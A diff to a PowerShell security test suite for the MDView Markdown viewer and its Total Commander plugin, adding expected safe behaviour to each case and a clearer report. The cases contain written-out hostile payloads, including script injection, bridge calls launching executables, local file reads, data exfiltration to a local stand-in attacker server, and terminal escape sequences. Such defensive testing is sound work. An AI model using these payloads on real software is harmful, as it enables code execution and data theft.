@@ -160,27 +160,27 @@ $downloads = Join-Path $env:USERPROFILE 'Downloads'
 # ---------------------------------------------------------------- cases
 $secretUrl = Get-VirtualUrl (Join-Path $attack 'secret.txt')
 $cases = @(
-    @{ Id = 'S1'; Title = 'inline <script> runs'; Doc = "# S1`n`n<script>$(Mark 'S1')</script>" }
-    @{ Id = 'S2'; Title = '<img onerror> handler runs'; Doc = "# S2`n`n<img src=`"missing.png`" onerror=`"$(Mark 'S2')`">" }
-    @{ Id = 'S3'; Title = '<svg onload> handler runs'; Doc = "# S3`n`n<svg onload=`"$(Mark 'S3')`"></svg>" }
-    @{ Id = 'S4'; Title = '<iframe srcdoc> script reaches the page'; Doc = "# S4`n`n<iframe srcdoc=`"&lt;script&gt;parent.$(Mark 'S4')&lt;/script&gt;`"></iframe>" }
-    @{ Id = 'S5'; Title = '<meta refresh> navigates away'; Doc = "# S5`n`n<meta http-equiv=`"refresh`" content=`"0;url=$srv/page-S5`">" }
-    @{ Id = 'S6'; Title = 'javascript: link runs when clicked'; Click = 'S6 link'; Doc = "# S6`n`n<a href=`"javascript:$(Mark 'S6')`">S6 link</a>" }
-    @{ Id = 'B1'; Title = 'bridge openLink starts canary.cmd next to the document'; Canary = $true; Doc = "# B1`n`n<script>chrome.webview.postMessage({type:'openLink', url: new URL('canary-B1.cmd', location.href).href})</script>" }
-    @{ Id = 'B2'; Title = 'bridge openLink starts C:\Windows\System32\calc.exe'; Calc = $true; Doc = "# B2`n`n<script>chrome.webview.postMessage({type:'openLink', url:'C:\\Windows\\System32\\calc.exe'})</script>" }
-    @{ Id = 'B3'; Title = 'bridge openLink starts a protocol handler (calculator:)'; Calc = $true; Doc = "# B3`n`n<script>chrome.webview.postMessage({type:'openLink', url:'calculator:'})</script>" }
-    @{ Id = 'B4'; Title = 'bridge openLink starts a file:/// URL'; Canary = $true; DocFn = { "# B4`n`n<script>chrome.webview.postMessage({type:'openLink', url:'$(Get-FileUrl (Join-Path $attack 'canary-B4.cmd'))'})</script>" } }
-    @{ Id = 'B5'; Title = 'any message containing "close" closes the viewer'; Close = $true; Doc = "# B5`n`n<script>chrome.webview.postMessage({type:'note', text:'close'})</script>" }
-    @{ Id = 'B6'; Title = 'remote page reached by script navigation uses the bridge'; Canary = $true; Page = $true; Doc = "# B6`n`n<script>location.href = '$srv/page-B6'</script>" }
-    @{ Id = 'F1'; Title = 'script reads a local file through the virtual origin'; Doc = "# F1`n`n<script>fetch('$secretUrl').then(r => r.text()).then(t => document.body.insertAdjacentHTML('beforeend', '<p>LEAK-' + t + '</p>'))</script>"; Detect = 'secret' }
-    @{ Id = 'F2'; Title = 'data can be sent to a server (fetch / image / beacon / websocket / CSS)'; Doc = "# F2`n`n<div style=`"width:10px;height:10px;background:url($srv/hit?c=F2css)`"></div>`n`n<script>fetch('$srv/hit?c=F2fetch'); new Image().src = '$srv/hit?c=F2img'; navigator.sendBeacon('$srv/hit?c=F2beacon'); try { new WebSocket('ws://127.0.0.1:$port/hit?c=F2ws') } catch (e) {}</script>"; Detect = 'hits-F2' }
-    @{ Id = 'F3'; Title = 'local .html next to the document runs script with bridge access'; Canary = $true; Html = $true; Doc = "# F3`n`n<script>location.href = 'evil-F3.html'</script>" }
-    @{ Id = 'N1'; Title = 'script navigates the viewer to an external page'; Doc = "# N1`n`n<script>location.href = '$srv/page-N1'</script>"; Detect = 'hits-page-N1' }
-    @{ Id = 'N2'; Title = 'window.open opens a new window'; Doc = "# N2`n`n<script>window.open('$srv/page-N2')</script>"; Detect = 'hits-page-N2' }
-    @{ Id = 'N3'; Title = 'a download is saved to the Downloads folder'; Doc = "# N3`n`n<a id=`"d`" href=`"$srv/download`" download>d</a><script>document.getElementById('d').click()</script>"; Detect = 'download' }
-    @{ Id = 'P1'; Title = 'remote image loads without asking (tracking pixel)'; Doc = "# P1`n`n![pixel]($srv/pixel.png?c=P1)"; Detect = 'hits-pixel' }
-    @{ Id = 'U1'; Title = 'clicking a link to a local .cmd starts it'; Canary = $true; Click = 'run the canary'; Doc = "# U1`n`n[run the canary](canary-U1.cmd)" }
-    @{ Id = 'TC1'; Title = 'TC search text breaks out into script'; PluginOnly = $true; Search = "x`"); $(Mark 'TC1'); (`""; Doc = "# TC1`n`nsearch target x" }
+    @{ Id = 'S1'; Safe = 'the script does not run'; Title = 'inline <script> runs'; Doc = "# S1`n`n<script>$(Mark 'S1')</script>" }
+    @{ Id = 'S2'; Safe = 'the handler does not run'; Title = '<img onerror> handler runs'; Doc = "# S2`n`n<img src=`"missing.png`" onerror=`"$(Mark 'S2')`">" }
+    @{ Id = 'S3'; Safe = 'the handler does not run'; Title = '<svg onload> handler runs'; Doc = "# S3`n`n<svg onload=`"$(Mark 'S3')`"></svg>" }
+    @{ Id = 'S4'; Safe = 'the frame and its script are blocked'; Title = '<iframe srcdoc> script reaches the page'; Doc = "# S4`n`n<iframe srcdoc=`"&lt;script&gt;parent.$(Mark 'S4')&lt;/script&gt;`"></iframe>" }
+    @{ Id = 'S5'; Safe = 'the viewer stays on the document; nothing is requested'; Title = '<meta refresh> navigates away'; Doc = "# S5`n`n<meta http-equiv=`"refresh`" content=`"0;url=$srv/page-S5`">" }
+    @{ Id = 'S6'; Safe = 'nothing runs when the link is clicked'; Title = 'javascript: link runs when clicked'; Click = 'S6 link'; Doc = "# S6`n`n<a href=`"javascript:$(Mark 'S6')`">S6 link</a>" }
+    @{ Id = 'B1'; Safe = 'the script does not run; nothing is started'; Title = 'bridge openLink starts canary.cmd next to the document'; Canary = $true; Doc = "# B1`n`n<script>chrome.webview.postMessage({type:'openLink', url: new URL('canary-B1.cmd', location.href).href})</script>" }
+    @{ Id = 'B2'; Safe = 'nothing is started'; Title = 'bridge openLink starts C:\Windows\System32\calc.exe'; Calc = $true; Doc = "# B2`n`n<script>chrome.webview.postMessage({type:'openLink', url:'C:\\Windows\\System32\\calc.exe'})</script>" }
+    @{ Id = 'B3'; Safe = 'nothing is started'; Title = 'bridge openLink starts a protocol handler (calculator:)'; Calc = $true; Doc = "# B3`n`n<script>chrome.webview.postMessage({type:'openLink', url:'calculator:'})</script>" }
+    @{ Id = 'B4'; Safe = 'nothing is started'; Title = 'bridge openLink starts a file:/// URL'; Canary = $true; DocFn = { "# B4`n`n<script>chrome.webview.postMessage({type:'openLink', url:'$(Get-FileUrl (Join-Path $attack 'canary-B4.cmd'))'})</script>" } }
+    @{ Id = 'B5'; Safe = 'the viewer stays open'; Title = 'any message containing "close" closes the viewer'; Close = $true; Doc = "# B5`n`n<script>chrome.webview.postMessage({type:'note', text:'close'})</script>" }
+    @{ Id = 'B6'; Safe = 'the viewer never shows the remote page; nothing is started'; Title = 'remote page reached by script navigation uses the bridge'; Canary = $true; Page = $true; Doc = "# B6`n`n<script>location.href = '$srv/page-B6'</script>" }
+    @{ Id = 'F1'; Safe = 'the file is not read'; Title = 'script reads a local file through the virtual origin'; Doc = "# F1`n`n<script>fetch('$secretUrl').then(r => r.text()).then(t => document.body.insertAdjacentHTML('beforeend', '<p>LEAK-' + t + '</p>'))</script>"; Detect = 'secret' }
+    @{ Id = 'F2'; Safe = 'nothing reaches the server'; Title = 'data can be sent to a server (fetch / image / beacon / websocket / CSS)'; Doc = "# F2`n`n<div style=`"width:10px;height:10px;background:url($srv/hit?c=F2css)`"></div>`n`n<script>fetch('$srv/hit?c=F2fetch'); new Image().src = '$srv/hit?c=F2img'; navigator.sendBeacon('$srv/hit?c=F2beacon'); try { new WebSocket('ws://127.0.0.1:$port/hit?c=F2ws') } catch (e) {}</script>"; Detect = 'hits-F2' }
+    @{ Id = 'F3'; Safe = 'the local .html is not shown; nothing runs or starts'; Title = 'local .html next to the document runs script with bridge access'; Canary = $true; Html = $true; Doc = "# F3`n`n<script>location.href = 'evil-F3.html'</script>" }
+    @{ Id = 'N1'; Safe = 'the viewer stays on the document'; Title = 'script navigates the viewer to an external page'; Doc = "# N1`n`n<script>location.href = '$srv/page-N1'</script>"; Detect = 'hits-page-N1' }
+    @{ Id = 'N2'; Safe = 'no window opens'; Title = 'window.open opens a new window'; Doc = "# N2`n`n<script>window.open('$srv/page-N2')</script>"; Detect = 'hits-page-N2' }
+    @{ Id = 'N3'; Safe = 'nothing is downloaded'; Title = 'a download is saved to the Downloads folder'; Doc = "# N3`n`n<a id=`"d`" href=`"$srv/download`" download>d</a><script>document.getElementById('d').click()</script>"; Detect = 'download' }
+    @{ Id = 'P1'; Safe = 'the image is not requested until the user allows it'; Title = 'remote image loads without asking (tracking pixel)'; Doc = "# P1`n`n![pixel]($srv/pixel.png?c=P1)"; Detect = 'hits-pixel' }
+    @{ Id = 'U1'; Safe = 'the script is not started (a real click shows a refusal message)'; Title = 'clicking a link to a local .cmd starts it'; Canary = $true; Click = 'run the canary'; Doc = "# U1`n`n[run the canary](canary-U1.cmd)" }
+    @{ Id = 'TC1'; Safe = 'the search text is only searched for, never run'; Title = 'TC search text breaks out into script'; PluginOnly = $true; Search = "x`"); $(Mark 'TC1'); (`""; Doc = "# TC1`n`nsearch target x" }
 )
 $pages['S5'] = "<html><body>left MDView (S5)</body></html>"
 $pages['N1'] = "<html><body>left MDView (N1)</body></html>"
@@ -304,7 +304,7 @@ function Invoke-Case($case, $hostKind) {
     if (-not $observed.Count) { $observed += 'nothing happened' }
 
     $result = if ($worked) { 'FAIL (attack worked)' } elseif ($notRun) { "ERROR (did not run: $notRun)" } else { 'PASS (blocked)' }
-    [pscustomobject]@{ Case = $id; Host = $hostKind; Attack = $case.Title; Result = $result; Observed = ($observed -join '; ') }
+    [pscustomobject]@{ Case = $id; Host = $hostKind; Attack = $case.Title; Safe = $case.Safe; Result = $result; Observed = ($observed -join '; ') }
 }
 
 try {
@@ -330,7 +330,7 @@ try {
         $raw = @()
         if ($bytes.Contains("$esc]0;PWNED-T1")) { $raw += 'OSC 0 (window title)' }
         if ($bytes.Contains("$esc]52;")) { $raw += 'OSC 52 (clipboard write)' }
-        $results += [pscustomobject]@{ Case = 'T1'; Host = 'exe --term'; Attack = 'escape sequences in the document reach the terminal'; Result = if ($raw.Count) { 'FAIL (attack worked)' } else { 'PASS (blocked)' }; Observed = if ($raw.Count) { "written raw: $($raw -join ', ')" } else { 'control characters removed' } }
+        $results += [pscustomobject]@{ Case = 'T1'; Host = 'terminal'; Attack = 'escape sequences in the document reach the terminal'; Safe = 'escape sequences from the document are removed'; Result = if ($raw.Count) { 'FAIL (attack worked)' } else { 'PASS (blocked)' }; Observed = if ($raw.Count) { "written raw: $($raw -join ', ')" } else { 'control characters removed' } }
         Write-Host "T1: $($results[-1].Result)"
     }
 }
@@ -344,18 +344,38 @@ finally {
 # ---------------------------------------------------------------- report
 $failed = @($results | Where-Object { $_.Result -like 'FAIL*' }).Count
 $errors = @($results | Where-Object { $_.Result -like 'ERROR*' }).Count
+# Table cells are shown as text: the attack descriptions contain HTML such as
+# <script>, which would otherwise be rendered (and hide the rest of the table).
+function Format-Cell([string]$s) {
+    $s.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;').Replace('|', '\|')
+}
+$hostNames = @{ exe = 'standalone viewer'; plugin = 'TC plugin'; terminal = 'terminal (`--term`)' }
 $lines = @(
     "# MDView security test: $Label",
     '',
     "- Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm')",
-    "- Exe: ``$(Split-Path $Exe -Leaf)`` (FileVersion $((Get-Item $Exe).VersionInfo.FileVersion))",
-    "- Plugin: ``$(Split-Path $Dll -Leaf)`` (FileVersion $((Get-Item $Dll).VersionInfo.FileVersion))",
-    "- Result: **$failed of $($results.Count) attacks worked**, $errors case(s) could not run",
+    "- Standalone viewer: ``$(Split-Path $Exe -Leaf)`` (FileVersion $((Get-Item $Exe).VersionInfo.FileVersion))",
+    "- TC plugin: ``$(Split-Path $Dll -Leaf)`` (FileVersion $((Get-Item $Dll).VersionInfo.FileVersion))",
+    "- **$failed of $($results.Count) attacks worked**, $errors could not run",
     '',
-    '| Case | Host | Attack | Result | Observed |',
-    '|---|---|---|---|---|'
+    '## How to read this',
+    '',
+    'Each row is one attack: a Markdown document written to abuse MDView, opened in the standalone viewer, in the',
+    'Total Commander plugin (through a test host that loads the plugin like TC does) or rendered to the terminal.',
+    'The test uses harmless stand-ins: a script that only writes a marker file, Calculator, and a local server on',
+    '127.0.0.1 that plays the attacker.',
+    '',
+    '- **PASS**: MDView did the safe thing; the attack was blocked.',
+    '- **FAIL**: the attack worked.',
+    '- **ERROR**: the case could not run, so it proves nothing.',
+    '',
+    '| Case | Where | Attack | Safe behaviour | Result | What the test saw |',
+    '|---|---|---|---|---|---|'
 )
-foreach ($r in $results) { $lines += "| $($r.Case) | $($r.Host) | $($r.Attack) | $($r.Result) | $($r.Observed.Replace('|', '/')) |" }
+foreach ($r in $results) {
+    $where = if ($hostNames.ContainsKey($r.Host)) { $hostNames[$r.Host] } else { $r.Host }
+    $lines += "| $($r.Case) | $where | $(Format-Cell $r.Attack) | $(Format-Cell $r.Safe) | $($r.Result) | $(Format-Cell $r.Observed) |"
+}
 $report = Join-Path $resultsDir "$Label.md"
 Set-Content -Path $report -Value ($lines -join "`n") -Encoding utf8
 Write-Host "`nreport: $report"
